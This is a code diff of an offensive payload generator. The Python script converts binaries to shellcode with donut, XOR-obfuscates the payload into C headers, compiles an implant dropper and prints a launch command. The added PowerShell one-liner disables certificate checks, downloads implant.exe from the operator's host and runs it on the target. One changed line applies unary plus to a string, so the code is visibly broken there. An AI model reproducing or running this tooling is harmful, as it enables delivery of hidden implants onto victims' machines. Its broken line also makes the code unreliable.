@@ -1,26 +1,11 @@
 import sys, getopt
-from Crypto.Cipher import AES
 import os
-from os import urandom
-import hashlib
+import stat
 import random
 import string
 import subprocess
 from urllib.parse import urlparse
 from pathlib import Path
-
-
-def pad(s):
-	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size).encode('ISO-8859-1')
-
-
-def aesenc(plaintext, key):
-	k = hashlib.sha256(key).digest()
-	iv = 16 * b'\x00'
-	plaintext = pad(plaintext)    
-	cipher = AES.new(k , AES.MODE_CBC, iv)
-	output = cipher.encrypt(plaintext)
-	return output
 
 
 def xor(data, key):
@@ -100,6 +85,8 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
                         except OSError as error: 
                                 pass
                         args = (donutBinary, '-f', '1', '-b', '1', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, '-i' , binary)
+                        st = os.stat(donutBinary)
+                        os.chmod(donutBinary, st.st_mode | stat.S_IEXEC)
                 
                 popen = subprocess.Popen(args, stdout=subprocess.PIPE)
                 popen.wait()
@@ -111,7 +98,7 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
 
                 shellcode = open(rawShellCode, "rb").read()
 
-                shellcodePath = os.path.join(Path(__file__).parent, '.\\bin\\'+shellcodeFile)
+                shellcodePath = os.path.join(Path(__file__).parent, 'bin', +shellcodeFile)
                 f = open(shellcodePath, "wb")
                 f.write(shellcode)
                 f.close()
@@ -131,20 +118,20 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
         template = template.replace("<URL>", fullLocation+" ")
         template = template.replace("<PORT>", str(port))
 
-        defFilePath = os.path.join(Path(__file__).parent, 'clearDef.h')
+        defFilePath = os.path.join(Path(__file__).parent, 'bin', 'clearDef.h')
         f = open(defFilePath, "w")
         f.truncate(0) 
         f.write(template)
         f.close()
 
         if os.name == 'nt':
-                fileEncryptPath = os.path.join(Path(__file__).parent, 'cryptDef.h')
+                fileEncryptPath = os.path.join(Path(__file__).parent, 'bin', 'cryptDef.h')
                 fileEncrypt = open(fileEncryptPath, 'w')
         else:
-                fileEncryptPath = os.path.join(Path(__file__).parent, 'cryptDef.h')
+                fileEncryptPath = os.path.join(Path(__file__).parent, 'bin', 'cryptDef.h')
                 fileEncrypt = open(fileEncryptPath, 'w')
 
-        fileClearPath = os.path.join(Path(__file__).parent, 'clearDef.h')
+        fileClearPath = os.path.join(Path(__file__).parent, 'bin', 'clearDef.h')
         fileClear = open(fileClearPath, 'r')
 
         Lines = fileClear.readlines()
@@ -152,10 +139,8 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
         characters = string.ascii_letters + string.digits
         password = ''.join(random.choice(characters) for i in range(16))
         KEY_XOR = password.replace('"','-').replace('\'','-')
-        KEY_AES = urandom(16)
 
-        AesBlock=False;
-        XorBlock=False;
+        XorBlock=False
         # Strips the newline character
         for line in Lines:
                 #print(line)
@@ -174,27 +159,9 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
                                         words[1]= printCiphertext(ciphertext)
                                         line =''.join(words)
 
-                if(AesBlock):
-                        words = line.split('"')
-                        if(len(words)>=3):
-                                if("AesKey" in words[0]):
-                                        words[1]= printCiphertext(KEY_AES.decode('ISO-8859-1'))
-                                        line =''.join(words)
-
-                                elif("payload" in words[0]):
-                                        plaintext = shellcode
-                                        ciphertext = aesenc(plaintext, KEY_AES)
-                                        
-                                        words[1]= printCiphertext(ciphertext.decode('ISO-8859-1'))
-                                        line =''.join(words)
-
                 if(line == "// TO XOR\n"):
                         XorBlock=True;
-                        AesBlock=False;
-                elif(line == "// TO AES\n"):
-                        AesBlock=True;
-                        XorBlock=False;
-
+                
                 fileEncrypt.writelines(line)
 
         fileEncrypt.close()
@@ -218,6 +185,10 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
                         pass
                 compileScript = os.path.join(Path(__file__).parent, './compile.sh')
                 args = compileScript.split()
+
+                st = os.stat(compileScript)
+                os.chmod(compileScript, st.st_mode | stat.S_IEXEC)
+                
         popen = subprocess.Popen(args, stdout=subprocess.PIPE, cwd=Path(__file__).parent)
         popen.wait()
 
@@ -242,18 +213,16 @@ def generatePayloads(binary, binaryArgs, rawShellCode, process, url, targetHost)
         print("\n[+] Done")
         
         url = parsed_url.path
-        if url[0] == "/":
-                url = url[1:]
-
-        cmdToRun = "Generated:\n"
-        cmdToRun+= schema + "://" + ip + ":" + str(port) + "/" + url + "/" + shellcodeFile + "\n"
-        cmdToRun+= schema + "://" + ip + ":" + str(port) + "/" + url + "/" + "implant.exe" + "\n"
+        if url:
+                if url[0] == "/":
+                        url = url[1:]
+                url += "/"
+                
+        cmdToRun  = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object Net.WebClient).DownloadFile('"
+        cmdToRun += schema + "://" + ip + ":" + str(port) + "/" + url + "implant.exe"
+        cmdToRun += "',(Get-Location).Path+'\\test.exe'); Start-Process test.exe;\n"
         droppersPath = [dropperExePath]
         shellcodesPath = [shellcodePath]
-
-        print(droppersPath)
-        print(shellcodesPath)
-        print(cmdToRun)
 
         return droppersPath, shellcodesPath, cmdToRun
 
